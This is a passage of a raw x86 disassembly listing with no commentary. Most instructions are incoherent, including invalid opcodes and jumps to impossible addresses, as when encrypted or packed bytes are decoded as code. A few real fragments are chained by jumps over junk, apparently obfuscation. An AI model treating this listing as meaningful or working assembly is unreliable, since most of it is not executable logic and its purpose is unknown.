  40cf11:	aam    0x37
  40cf13:	jl     0x40cf86
  40cf15:	add    edi,DWORD PTR [esi-0xf]
  40cf18:	push   0xffffffda
  40cf1a:	leave  
  40cf1b:	add    ebx,edi
  40cf1d:	adc    al,0x41
  40cf1f:	push   ecx
  40cf20:	mov    ebp,0x3075fd30
  40cf25:	aaa    
  40cf26:	in     al,0x59
  40cf28:	xor    al,0x4
  40cf2a:	and    ah,BYTE PTR ds:[edi-0x2ca6e7de]
  40cf31:	mov    edi,DWORD PTR [ecx]
  40cf33:	mov    fs,WORD PTR [ecx-0xb]
  40cf36:	mov    dl,0xfd
  40cf38:	stc    
  40cf39:	push   ds
  40cf3a:	je     0x40cfa6
  40cf3c:	les    esi,FWORD PTR [edi]
  40cf3e:	(bad)  
  40cf3f:	(bad)  
  40cf40:	sbb    eax,0x83bd3dee
  40cf45:	dec    edx
  40cf46:	jecxz  0x40cee1
  40cf48:	mov    cs,WORD PTR [ebx+eiz*1]
  40cf4b:	and    ecx,ebx
  40cf4d:	jge    0x40cf3f
  40cf4f:	or     esi,DWORD PTR [ecx]
  40cf51:	scas   al,BYTE PTR es:[edi]
  40cf52:	shl    BYTE PTR gs:[ebx-0x39],1
  40cf56:	jno    0x40cfb2
  40cf58:	cmp    ebx,DWORD PTR [ebx+0x40]
  40cf5b:	jl     0x40cfb0
  40cf5d:	jp     0x40cf37
  40cf5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf60:	fst    st(3)
  40cf62:	xchg   ebx,eax
  40cf63:	leave  
  40cf64:	mov    dl,dl
  40cf66:	popf   
  40cf67:	jl     0x40cf5e
  40cf69:	jg     0x40cfdd
  40cf6b:	or     eax,DWORD PTR [esi]
  40cf6d:	rcl    DWORD PTR [esi+0x1b472eee],1
  40cf73:	ret    0x1724
  40cf76:	aad    0xa2
  40cf78:	add    DWORD PTR [esi+0x60],edx
  40cf7b:	fld    st(1)
  40cf7d:	test   BYTE PTR [ebx-0x75],bh
  40cf80:	jle    0x40cf1d
  40cf82:	mov    al,0x8
  40cf84:	ficom  WORD PTR [ecx]
  40cf86:	fwait
  40cf87:	lods   al,BYTE PTR ds:[esi]
  40cf88:	mov    dl,0x19
  40cf8a:	test   DWORD PTR cs:[edx+edx*8],edx
  40cf8e:	mov    eax,0x8eec5f1e
  40cf93:	scas   al,BYTE PTR es:[edi]
  40cf94:	ja     0x40cf2f
  40cf96:	repnz inc ecx
  40cf98:	into   
  40cf99:	sahf   
  40cf9a:	adc    DWORD PTR [ecx-0x4fa05851],esi
  40cfa0:	xor    BYTE PTR [edi+0xbddb427],dh
  40cfa6:	and    DWORD PTR ds:0xcc7c05,ecx
  40cfac:	inc    ecx
  40cfad:	das    
  40cfae:	test   al,0xfd
  40cfb0:	(bad)  
  40cfb1:	std    
  40cfb2:	in     eax,0x3
  40cfb4:	push   ss
  40cfb5:	jle    0x40cf75
  40cfb7:	nop
  40cfb8:	clc    
  40cfb9:	adc    DWORD PTR [ebx+0x2a5357bd],0xffffff87
  40cfc0:	cmp    eax,0x6ac477cf
  40cfc5:	sbb    DWORD PTR [eax+0x544b9304],0xffffffc9
  40cfcc:	and    eax,0xf1f271d0
  40cfd1:	call   0x3ea62a44
  40cfd6:	or     eax,0x7b15e257
  40cfdb:	mov    ebp,0x7ff3a23e
  40cfe0:	or     BYTE PTR [ebp-0x7044449],ah
  40cfe6:	outs   dx,BYTE PTR ds:[esi]
  40cfe7:	push   esi
  40cfe8:	loop   0x40cfb4
  40cfea:	iret   
  40cfeb:	and    ebp,DWORD PTR [edi+eax*4]
  40cfee:	neg    DWORD PTR [ecx+0x76]
  40cff1:	xchg   BYTE PTR [edi],dl
  40cff3:	mov    dl,0x99
  40cff5:	mov    cl,0xfb
  40cff7:	mov    es,WORD PTR [edx+0x3c4b1f9a]
  40cffd:	push   ss
  40cffe:	xchg   BYTE PTR [edi+0x666ff89d],ah
  40d004:	add    cl,bl
  40d006:	clc    
  40d007:	mov    ds:0xbc8a6a4e,eax
  40d00c:	mov    ah,0x48
  40d00e:	ficom  WORD PTR [ebx-0x121db128]
  40d014:	push   esp
  40d015:	repz fldlg2 
  40d018:	or     al,0x58
  40d01a:	add    al,0xf5
  40d01c:	xor    DWORD PTR [ebp-0x12],ebp
  40d01f:	daa    
  40d020:	adc    al,0x40
  40d022:	jno    0x40d02b
  40d024:	xchg   DWORD PTR [esi],esi
  40d026:	dec    edi
  40d027:	loopne 0x40cfcb
  40d029:	dec    ecx
  40d02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d02b:	bound  eax,QWORD PTR [edi+0x3cc13f58]
  40d031:	sar    BYTE PTR [ebx-0x6b],0xe5
  40d035:	cmp    BYTE PTR [eax+0x7cca75f7],dl
  40d03b:	or     BYTE PTR [esi+0x3d],ah
  40d03e:	push   ds
  40d03f:	mov    ebx,0xa34d548a
  40d044:	ins    DWORD PTR es:[edi],dx
  40d045:	je     0x40d03a
  40d047:	call   FWORD PTR [ebx+0x43]
  40d04a:	sbb    ebx,DWORD PTR [eax+0x79]
  40d04d:	sub    eax,0x447186
  40d052:	jmp    0x40d0b9
  40d054:	adc    ch,BYTE PTR [ebp-0x798cf40b]
  40d05a:	jmp    0x342e8a3e
  40d05f:	mov    BYTE PTR [ecx-0x7a],bl
  40d062:	adc    ch,BYTE PTR [ecx+0x6d]
  40d065:	rcl    BYTE PTR [edx-0x2213145d],1
  40d06b:	iret   
  40d06c:	aad    0x65
  40d06e:	fdivr  QWORD PTR [edi+0x4e]
  40d071:	pushf  
  40d072:	setno  BYTE PTR [edi-0x33]
  40d076:	adc    cl,dl
  40d078:	push   edx
  40d079:	mov    edi,0x7272b9fa
  40d07e:	out    dx,eax
  40d07f:	cdq    
  40d080:	ja     0x40d03f
  40d082:	in     al,dx
  40d083:	cli    
  40d084:	hlt    
  40d085:	in     al,dx
  40d086:	xor    ch,0xd8
  40d089:	xor    eax,0xdf5e62a7
  40d08e:	push   edx
  40d08f:	push   esi
  40d090:	lods   eax,DWORD PTR ds:[esi]
  40d091:	adc    DWORD PTR [ebp-0x4a],esp
  40d094:	stos   BYTE PTR es:[edi],al
  40d095:	sbb    ecx,DWORD PTR [esi-0x51ca52f5]
  40d09b:	sub    edi,edi
  40d09d:	mov    eax,0x7b7c1c91
  40d0a2:	mov    cl,BYTE PTR [esi]
  40d0a4:	lods   al,BYTE PTR ds:[esi]
  40d0a5:	or     edi,eax
  40d0a7:	mov    eax,0xd33f2fc7
  40d0ac:	sub    DWORD PTR [edx-0x27],ebx
  40d0af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0b0:	mov    eax,0xb9015935
  40d0b5:	fimul  DWORD PTR [eax+0x12]
  40d0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0b9:	ja     0x40d0f1
  40d0bb:	dec    eax
  40d0bc:	add    ecx,ebx
  40d0be:	stos   BYTE PTR es:[edi],al
  40d0bf:	inc    ebx
  40d0c0:	add    dh,BYTE PTR ss:[edi+ecx*1]
  40d0c4:	xchg   BYTE PTR [esi-0x10],ah
  40d0c7:	(bad)  
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	(bad)  
  40d0ee:	iret   
  40d0ef:	inc    eax
  40d0f0:	mov    ebp,DWORD PTR [eax-0x56]
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d124
  40d0fb:	adc    BYTE PTR [esi+0x10549ccf],cl
  40d101:	or     DWORD PTR [edx+esi*4-0x2d],0x49
  40d106:	push   edi
  40d107:	js     0x40d104
  40d109:	mov    esp,0x60528d6a
  40d10e:	or     ebp,0x980561e8
  40d114:	mov    eax,ds:0xcd9addfb
  40d119:	cmp    BYTE PTR [ebp-0x3bdd6aba],ah
  40d11f:	das    
  40d120:	adc    DWORD PTR [esi],edi
  40d122:	dec    ecx
  40d123:	fxch   st(2)
  40d125:	add    al,0x89
  40d127:	lods   eax,DWORD PTR ds:[esi]
  40d128:	push   ss
  40d129:	adc    eax,0xc401ebd8
  40d12e:	outs   dx,DWORD PTR ds:[esi]
  40d12f:	or     bh,BYTE PTR [edi-0x5590a742]
  40d135:	cli    
  40d136:	outs   dx,DWORD PTR ds:[esi]
  40d137:	sbb    ebp,DWORD PTR [eax]
  40d139:	je     0x40d0ca
  40d13b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d13c:	pop    ebp
  40d13d:	sbb    al,0xc0
  40d13f:	jae    0x40d106
  40d141:	imul   edi,DWORD PTR [edx],0x851288d3
  40d147:	push   eax
  40d148:	addr16 aam 0x59
  40d14b:	sub    DWORD PTR [esi+0x5e],esi
  40d14e:	ror    DWORD PTR [esi-0x40],cl
  40d151:	rcr    BYTE PTR [edx+0x5668385a],0x76
  40d158:	repnz hlt 
  40d15a:	aaa    
  40d15b:	dec    ebx
  40d15c:	jecxz  0x40d132
  40d15e:	add    edi,esp
  40d160:	inc    ecx
  40d161:	data16 sbb cl,BYTE PTR [ebx]
  40d164:	aam    0xb8
  40d166:	int    0xed
  40d168:	push   edx
  40d169:	or     ebx,esi
  40d16b:	add    al,0xf9
  40d16d:	xor    esi,DWORD PTR ds:0x9ea08ada
  40d173:	stos   DWORD PTR es:[edi],eax
  40d174:	fldcw  WORD PTR [ecx+0x42d0044]
  40d17a:	dec    esp
  40d17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d17c:	ret    0xf68f
  40d17f:	add    al,0xec
  40d181:	mov    fs,edx
  40d183:	adc    eax,DWORD PTR [ebx+0x720f1874]
  40d189:	iret   
  40d18a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d18b:	loopne 0x40d17d
  40d18d:	imul   edi,DWORD PTR [ebx],0xffffff9e
  40d190:	sbb    eax,0xe18e9b63
  40d195:	lock out 0x53,eax
  40d198:	pop    edx
  40d199:	dec    ebx
  40d19a:	cld    
  40d19b:	mov    BYTE PTR [edx+ebx*8],bh
  40d19e:	sub    ch,BYTE PTR [ebp+0xc60e361]
  40d1a4:	dec    edi
  40d1a5:	xlat   BYTE PTR ds:[ebx]
  40d1a6:	xchg   ebx,eax
  40d1a7:	dec    ecx
  40d1a8:	xchg   ebx,eax
  40d1a9:	(bad)  
  40d1aa:	pop    esi
  40d1ab:	nop
  40d1ac:	mov    edx,0x33834021
  40d1b1:	mov    eax,0xdd85c453
  40d1b6:	push   esp
  40d1b7:	mov    edx,DWORD PTR [edx+0x20]
  40d1ba:	ins    DWORD PTR es:[edi],dx
  40d1bb:	cmp    bl,ch
  40d1bd:	or     eax,0xffffff91
  40d1c0:	popf   
  40d1c1:	or     BYTE PTR [ebx-0x5c8ee46b],dl
  40d1c7:	repz sbb DWORD PTR [eax],0x1
  40d1cb:	gs iret 
  40d1cd:	fnstsw WORD PTR [ebx]
  40d1cf:	mov    WORD PTR [eax-0x3bcb3b1a],ss
  40d1d5:	mov    ebx,0x941fb30a
  40d1da:	es call 0x53feebf5
  40d1e0:	fsub   DWORD PTR [edi+0x5e4d1846]
  40d1e6:	loop   0x40d21d
  40d1e8:	push   edi
  40d1e9:	dec    esi
  40d1ea:	call   0xde73eaf1
  40d1ef:	inc    esp
  40d1f0:	jg     0x40d1a3
  40d1f2:	and    eax,0x33b494ce
  40d1f7:	xchg   edi,eax
  40d1f8:	ins    DWORD PTR es:[edi],dx
  40d1f9:	jmp    0xafd9f98b
  40d1fe:	aas    
  40d1ff:	stos   BYTE PTR es:[edi],al
  40d200:	pusha  
  40d201:	(bad)  
  40d202:	int3   
  40d203:	push   esi
  40d204:	sbb    ah,BYTE PTR [ecx-0x58e2db73]
  40d20a:	sahf   
  40d20b:	add    ebp,DWORD PTR [ecx-0x374e2caf]
  40d211:	ret    0xd0fd
  40d214:	mov    cl,0x65
  40d216:	sbb    cl,cl
  40d218:	shr    BYTE PTR [eax],1
  40d21a:	jmp    0xdb7c167e
  40d21f:	int    0x50
  40d221:	mov    dh,dh
  40d223:	lods   al,BYTE PTR ds:[esi]
  40d224:	outs   dx,BYTE PTR ds:[esi]
  40d225:	in     al,0x8
  40d227:	retf   
  40d228:	dec    ebp
  40d229:	inc    DWORD PTR [edx]
  40d22b:	rcr    ah,1
  40d22d:	test   BYTE PTR [edx+ecx*4],0x8c
  40d231:	mov    edx,ebp
  40d233:	xor    cl,bl
  40d235:	sbb    dh,ah
  40d237:	sbb    al,BYTE PTR [ebx-0x78]
  40d23a:	popf   
  40d23b:	out    dx,al
  40d23c:	pop    esp
  40d23d:	sbb    bh,0x53
  40d240:	and    cl,0xc3
  40d243:	inc    esi
  40d244:	add    esp,DWORD PTR [ebx+0x42]
  40d247:	pop    es
  40d248:	shl    DWORD PTR [esi],cl
  40d24a:	sub    eax,esp
  40d24c:	outs   dx,BYTE PTR ds:[esi]
  40d24d:	scas   eax,DWORD PTR es:[edi]
  40d24e:	out    0xe6,al
  40d250:	jo     0x40d25e
  40d252:	stos   BYTE PTR es:[edi],al
  40d253:	lea    edx,[edi]
  40d255:	xchg   ebp,eax
  40d256:	frstor [ecx]
  40d258:	or     eax,0x8115b8c
  40d25d:	int3   
  40d25e:	outs   dx,BYTE PTR ds:[esi]
  40d25f:	lea    edi,[ebx+0x64cca607]
  40d265:	fwait
  40d266:	or     ebp,ecx
  40d268:	dec    edx
  40d269:	xor    BYTE PTR [eax+0x27417d35],ch
  40d26f:	push   0x8888540b
  40d274:	jnp    0x40d201
  40d276:	int    0x41
  40d278:	dec    ecx
  40d279:	test   al,0x5d
  40d27b:	out    0x62,al
  40d27d:	jmp    0xde7af890
  40d282:	ror    BYTE PTR [ebp-0x75],1
  40d285:	add    DWORD PTR [edx+0x7de161d3],0xb08dfd9
  40d28f:	rol    DWORD PTR [edi-0x26c9f089],0x2b
  40d296:	fs jg  0x40d2cc
  40d299:	sbb    DWORD PTR [edx+0xe],ecx
  40d29c:	and    bh,BYTE PTR [eax+0x28]
  40d29f:	ja     0x40d2f4
  40d2a1:	cmp    DWORD PTR [ecx-0x1e3fbf8],esi
  40d2a7:	scas   eax,DWORD PTR es:[edi]
  40d2a8:	shl    BYTE PTR [eax],cl
  40d2aa:	jg     0x40d263
  40d2ac:	and    eax,0xdb7feefb
  40d2b1:	or     esi,DWORD PTR [ebx+esi*1+0x12]
  40d2b5:	pop    ebx
  40d2b6:	xchg   edx,eax
  40d2b7:	cmc    
  40d2b8:	sti    
  40d2b9:	inc    eax
  40d2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2bb:	mov    fs,WORD PTR [esi-0x46]
  40d2be:	inc    ebp
  40d2bf:	enter  0x84df,0xa2
  40d2c3:	not    BYTE PTR ds:0xa854d60e
  40d2c9:	xor    DWORD PTR [edi],0x29
  40d2cc:	ret    0x2a9b
  40d2cf:	mov    esp,0xbf77f08a
  40d2d4:	add    BYTE PTR [esi+0x5f],bh
  40d2d7:	(bad)  [ebx-0x62f22312]
  40d2dd:	mov    ch,0x42
  40d2df:	loop   0x40d354
  40d2e1:	xor    DWORD PTR [ebp+0x49],ebp
  40d2e4:	outs   dx,DWORD PTR ds:[esi]
  40d2e5:	fwait
  40d2e6:	push   ds
  40d2e7:	jbe    0x40d33c
  40d2e9:	sub    edx,esi
  40d2eb:	test   DWORD PTR ds:0x2c4fa325,edx
  40d2f1:	push   esi
  40d2f2:	retf   0x1a69
  40d2f5:	int    0xe7
  40d2f7:	in     al,0xba
  40d2f9:	test   DWORD PTR [ebp+0x231e6a2a],ecx
  40d2ff:	mov    ebx,0x6ded010c
  40d304:	jge    0x40d331
  40d306:	ds pop ss
  40d308:	dec    ecx
  40d30a:	loop   0x40d339
  40d30c:	jne    0x40d29e
  40d30e:	xchg   ebx,eax
  40d30f:	jne    0x40d2bb
  40d311:	loopne 0x40d32b
  40d313:	aas    
  40d314:	retfw  0xba3
  40d318:	ja     0x40d376
  40d31a:	nop
  40d31b:	cmc    
  40d31c:	inc    edx
  40d31d:	in     al,dx
  40d31e:	and    ebp,ebx
  40d320:	div    DWORD PTR [ebp+0x5ab9c426]
  40d326:	out    0x25,eax
  40d328:	or     eax,DWORD PTR [edi+0x76]
  40d32b:	inc    dh
  40d32d:	lea    eax,[edi-0x60]
  40d330:	mov    ds:0x84892b17,eax
  40d335:	repnz pop ds
  40d337:	fcmovnbe st,st(6)
  40d339:	xor    BYTE PTR [ebp+0x143a5647],0x31
  40d340:	add    ebp,DWORD PTR [edx-0x72]
  40d343:	pop    ebx
  40d344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d345:	outs   dx,BYTE PTR ds:[esi]
  40d346:	mov    eax,ds:0x2a9caa11
  40d34b:	int    0x30
  40d34d:	jmp    0x40d35c
  40d34f:	fimul  DWORD PTR [edi-0x9fcade3]
  40d355:	pop    eax
  40d356:	sub    eax,0x91655d7f
  40d35b:	jg     0x40d331
  40d35d:	ins    BYTE PTR es:[edi],dx
  40d35e:	fwait
  40d35f:	add    ecx,DWORD PTR [eax]
  40d361:	mov    eax,ds:0x124ac679
  40d366:	outs   dx,DWORD PTR ds:[esi]
  40d367:	inc    esp
  40d368:	mov    DWORD PTR [ebx-0x51],ebp
  40d36b:	pop    esp
  40d36c:	mov    cl,0xfc
  40d36e:	dec    ecx
  40d36f:	or     eax,0x777387a8
  40d374:	push   ds
  40d375:	std    
  40d376:	rol    BYTE PTR [eax-0x78f49bc9],cl
  40d37c:	add    DWORD PTR [ecx-0x28],edi
  40d37f:	and    cl,bl
  40d381:	xor    ch,bh
  40d383:	and    BYTE PTR [esi+0x3e1a5e5d],0x6c
  40d38a:	push   0xd8d6e146
  40d38f:	loop   0x40d34c
  40d391:	cwde   
  40d392:	pop    ss
  40d393:	inc    eax
  40d394:	mov    ds:0x78b71fb0,eax
  40d399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d39a:	inc    esi
  40d39b:	lock xchg edi,eax
  40d39d:	sub    ch,bh
  40d39f:	adc    ebx,DWORD PTR [eax+0x6f21bfe6]
  40d3a5:	cmp    edi,DWORD PTR [ecx]
  40d3a7:	fimul  DWORD PTR [edi+0x15ac5c4c]
  40d3ad:	mov    bh,0x68
  40d3af:	retf   
  40d3b0:	mov    eax,ds:0x4b2408f5
  40d3b5:	fadd   st,st(3)
  40d3b7:	xchg   DWORD PTR [ebx],eax
  40d3b9:	inc    esi
  40d3ba:	maxps  xmm7,XMMWORD PTR [esi+0x2fe472c2]
  40d3c1:	mov    bl,0x46
  40d3c3:	dec    esi
  40d3c4:	jb     0x40d405
  40d3c6:	(bad)  
  40d3c7:	sub    BYTE PTR ds:0xf01d7c93,bh
  40d3cd:	mov    ds:0x222f989,eax
  40d3d2:	add    eax,0x8617ad41
  40d3d7:	and    al,0x9c
  40d3d9:	inc    ebp
  40d3da:	aaa    
  40d3db:	cmp    BYTE PTR [esi+0x5b],ah
  40d3de:	sahf   
  40d3df:	cmp    DWORD PTR [ebx],0x816f0d57
  40d3e5:	call   0x2630:0x7e3aeba4
  40d3ec:	dec    ebp
  40d3ed:	repz bnd js 0x40d3dc
  40d3f1:	cdq    
  40d3f2:	sub    cl,al
  40d3f4:	mov    bl,0x66
  40d3f6:	bswap  ebx
  40d3f8:	jmp    0xe8f9:0xc4762054
  40d3ff:	test   cl,ch
  40d401:	lahf   
  40d402:	inc    edi
  40d403:	push   0x6c2a455b
  40d408:	xor    BYTE PTR [edi-0x7c7d157c],0xc1
  40d40f:	rcl    DWORD PTR [ebp-0x32],cl
  40d412:	outs   dx,DWORD PTR ds:[esi]
  40d413:	or     eax,0x7a4703ea
  40d418:	jl     0x40d498
  40d41a:	in     eax,0xb3
  40d41c:	sar    BYTE PTR [esi+0x79169d31],1
  40d422:	inc    ebx
  40d423:	inc    esp
  40d424:	fdiv   QWORD PTR [esi+0x76d4c291]
  40d42a:	aas    
  40d42b:	dec    ebx
  40d42c:	dec    esp
  40d42d:	fidivr DWORD PTR [edi]
  40d42f:	in     al,dx
  40d430:	or     DWORD PTR [edi+0x74fc1088],edx
  40d436:	push   ebp
  40d437:	(bad)  
  40d439:	add    al,0x2b
  40d43b:	jmp    0x9996:0xa4f7458
  40d442:	cdq    
  40d443:	sbb    eax,0xdc394c74
  40d448:	push   ebx
  40d449:	lods   al,BYTE PTR ds:[esi]
  40d44a:	jle    0x40d400
  40d44c:	lods   al,BYTE PTR ds:[esi]
  40d44d:	ficomp DWORD PTR [eax]
  40d44f:	enter  0x392,0xbb
  40d453:	mov    ss,esi
  40d455:	sbb    ebp,DWORD PTR [esi]
  40d457:	sahf   
  40d458:	mov    esp,0xb83ec5e0
  40d45d:	mov    ah,0xdf
  40d45f:	aam    0x12
  40d461:	(bad)  
  40d462:	ins    BYTE PTR es:[edi],dx
  40d463:	lahf   
  40d464:	dec    esi
  40d465:	add    DWORD PTR [esi-0x1e16e024],ecx
  40d46b:	in     eax,0x23
  40d46d:	and    DWORD PTR [ebx-0x29f3b359],edx
  40d473:	les    ebx,FWORD PTR [esi+0x25]
  40d476:	mov    DWORD PTR [esi-0x3b],esp
  40d479:	imul   ebp,DWORD PTR [ecx+0x49bc9c20],0xeab87138
  40d483:	out    dx,al
  40d484:	push   ss
  40d485:	xor    dl,cl
  40d487:	outs   dx,BYTE PTR ds:[esi]
  40d488:	fidivr DWORD PTR [edx]
  40d48a:	add    al,0x2d
  40d48c:	push   ds
  40d48d:	idiv   DWORD PTR [eax]
  40d48f:	clc    
  40d490:	xchg   edi,eax
  40d491:	daa    
  40d492:	test   BYTE PTR [edi],dl
  40d494:	jmp    0x53f5d11d
  40d499:	fsub   DWORD PTR [ecx]
  40d49b:	mov    edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x59d3:0xb81a1d63
  40d4c6:	push   ss
  40d4c7:	div    BYTE PTR [edi]
  40d4c9:	leave  
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d495
  40d4d2:	xor    BYTE PTR [ecx],al
  40d4d4:	popa   
  40d4d5:	adc    eax,0xb00e67d8
  40d4da:	push   0x41211d2d
  40d4df:	mov    ds:0x5cb0452c,eax
  40d4e4:	popa   
  40d4e5:	je     0x40d47e
  40d4e7:	inc    ebx
  40d4e8:	pop    edi
  40d4e9:	aaa    
  40d4ea:	mov    esi,eax
  40d4ec:	popa   
  40d4ed:	mov    BYTE PTR [edx-0x611c309f],dh
  40d4f3:	or     cl,ch
  40d4f5:	pop    esp
  40d4f6:	(bad)  
  40d4f7:	mov    ebp,0x8d7c015d
  40d4fc:	jp     0x40d4b3
  40d4fe:	(bad)  
  40d4ff:	les    eax,FWORD PTR [ebp-0x6ce746f5]
  40d505:	cmp    esi,0xfffffffb
  40d508:	mov    ch,0xc7
  40d50a:	adc    ebx,eax
  40d50c:	lfs    ebp,FWORD PTR [edi]
  40d50f:	out    0xb8,al
  40d511:	stos   DWORD PTR es:[edi],eax
  40d512:	nop
  40d513:	repnz mov dl,0xba
  40d516:	(bad)  
  40d517:	jno    0x40d4f4
  40d519:	mov    bh,0x3
  40d51b:	rcl    BYTE PTR [ebx+esi*1-0x61],0xe7
  40d520:	jp     0x40d4ac
  40d522:	dec    esi
  40d523:	cmp    esp,DWORD PTR [eax+0x52]
  40d526:	leave  
  40d527:	mov    BYTE PTR [ecx-0x2e],dl
  40d52a:	add    DWORD PTR [edx-0x3637b8be],esp
  40d530:	pop    ds
  40d531:	lods   eax,DWORD PTR ds:[esi]
  40d532:	pushf  
  40d533:	cmp    BYTE PTR [ecx],dl
  40d535:	push   esp
  40d536:	popa   
  40d537:	mov    eax,0x7b898896
  40d53c:	es ja  0x40d4dd
  40d53f:	out    dx,eax
  40d540:	(bad)  
  40d541:	mov    dh,0xc7
  40d543:	inc    ebx
  40d544:	push   0x71d633c9
  40d549:	ret    0xee5a
  40d54c:	lock xor al,0x7a
  40d54f:	jle    0x40d585
  40d551:	xchg   BYTE PTR [ebp-0x5e7b1da4],bl
  40d557:	jne    0x40d54e
  40d559:	repz fcom QWORD PTR [esp+edx*4+0x4fa622e3]
  40d561:	(bad)  
  40d562:	xor    al,0xb1
  40d564:	or     dl,dl
  40d566:	dec    edi
  40d567:	clc    
  40d568:	popf   
  40d569:	icebp  
  40d56a:	out    dx,al
  40d56b:	xchg   DWORD PTR [ecx-0x5d],esp
  40d56e:	push   ss
  40d56f:	mov    ecx,0x9356dbb4
  40d574:	call   0xdc88:0x74c5ef8a
  40d57b:	ins    DWORD PTR es:[edi],dx
  40d57c:	iret   
  40d57d:	jb     0x40d579
  40d57f:	out    dx,al
  40d580:	xor    al,0x28
  40d582:	enter  0xbce7,0x83
  40d586:	jo     0x40d522
  40d588:	xchg   edx,ecx
  40d58a:	stc    
  40d58b:	fst    DWORD PTR [edi-0x524a1eaa]
  40d591:	mov    edx,edi
  40d593:	xor    esi,DWORD PTR [ecx+0x3d1fb9a9]
  40d599:	mov    ebx,0x6c3aac91
  40d59e:	adc    esp,ecx
  40d5a0:	xchg   esi,eax
  40d5a1:	mov    eax,0x4fca945f
  40d5a6:	inc    edi
  40d5a7:	mov    BYTE PTR [esi+0x3e],bh
  40d5aa:	(bad)  
  40d5ab:	and    eax,DWORD PTR [eax+0x16ee02e5]
  40d5b1:	test   edx,ecx
  40d5b3:	dec    eax
  40d5b4:	stos   DWORD PTR es:[edi],eax
  40d5b5:	outs   dx,BYTE PTR ds:[esi]
  40d5b6:	and    BYTE PTR [edx+0x44],ah
  40d5b9:	pop    esi
  40d5ba:	repnz xor BYTE PTR [ebx-0x37],bh
  40d5be:	das    
  40d5bf:	(bad)  
  40d5c0:	xlat   BYTE PTR ds:[ebx]
  40d5c1:	test   DWORD PTR [eax+eax*4],edx
  40d5c4:	mov    bl,0x76
  40d5c6:	xchg   edi,eax
  40d5c7:	cmp    BYTE PTR [edi+ecx*1+0x6d99c1e2],ah
  40d5ce:	retf   0xa2b4
  40d5d1:	popf   
  40d5d2:	stc    
  40d5d3:	xchg   ebp,eax
  40d5d4:	cmp    al,BYTE PTR [eax+eax*4+0x57f49876]
  40d5db:	xchg   ebx,eax
  40d5dc:	rcl    BYTE PTR [edx+ebx*4-0x3fd27ba3],cl
  40d5e3:	lods   al,BYTE PTR ds:[esi]
  40d5e4:	adc    al,0x45
  40d5e6:	push   esi
  40d5e7:	xor    bl,BYTE PTR [esi-0x23ca3456]
  40d5ed:	lea    esp,[ebp+0x9]
  40d5f0:	jmp    0x40d5f5
  40d5f2:	leave  
  40d5f3:	cs ss loope 0x40d653
  40d5f7:	into   
  40d5f8:	xlat   BYTE PTR ds:[ebx]
  40d5f9:	out    dx,eax
  40d5fa:	loopne 0x40d5d3
  40d5fc:	mov    esp,0x908f529b
  40d601:	outs   dx,DWORD PTR ds:[esi]
  40d602:	push   cs
  40d603:	adc    esp,DWORD PTR [esi+0x2a]
  40d606:	xchg   esp,eax
  40d607:	xor    BYTE PTR [ebp-0x2f289720],al
  40d60d:	push   edx
  40d60e:	out    0xdd,eax
  40d610:	out    0x80,eax
  40d612:	pop    edx
  40d613:	loope  0x40d5c2
  40d615:	push   0x707f882e
  40d61a:	dec    ecx
  40d61b:	jle    0x40d638
  40d61d:	fwait
  40d61e:	and    al,al
  40d620:	mov    ebp,0x3bf4957e
  40d625:	jge    0x40d67a
  40d627:	nop
  40d628:	loope  0x40d66d
  40d62a:	add    BYTE PTR [ebx],dh
  40d62c:	xor    al,0xb8
  40d62e:	out    0x1a,eax
  40d630:	add    ah,BYTE PTR [ecx+0x16651900]
  40d636:	cs jmp 0xdc80:0xea5c266f
  40d63e:	test   BYTE PTR [ebp+esi*2-0x41],bl
  40d642:	mov    esi,0xdaaa4256
  40d647:	nop
  40d648:	inc    edi
  40d649:	inc    ebp
  40d64a:	adc    BYTE PTR [ecx-0x6],0x3b
  40d64e:	pop    ebx
  40d64f:	xchg   edx,eax
  40d650:	call   0xa0f8c1a6
  40d655:	ds or  eax,0x4d1cc58
  40d65b:	or     BYTE PTR [edi+0x2f],0x17
  40d65f:	loopne 0x40d66d
  40d661:	repnz adc eax,0x6a2ce025
  40d667:	rol    BYTE PTR [eax+ebp*4+0x2d],cl
  40d66b:	(bad)  
  40d66c:	push   eax
  40d66d:	or     eax,0xa75ba594
  40d672:	jmp    0x2a618185
  40d677:	(bad)  
  40d678:	pop    ds
  40d679:	mov    WORD PTR [ecx+0x6697a702],es
  40d67f:	cld    
  40d680:	ret    0x5ade
  40d683:	sub    eax,0xdec01303
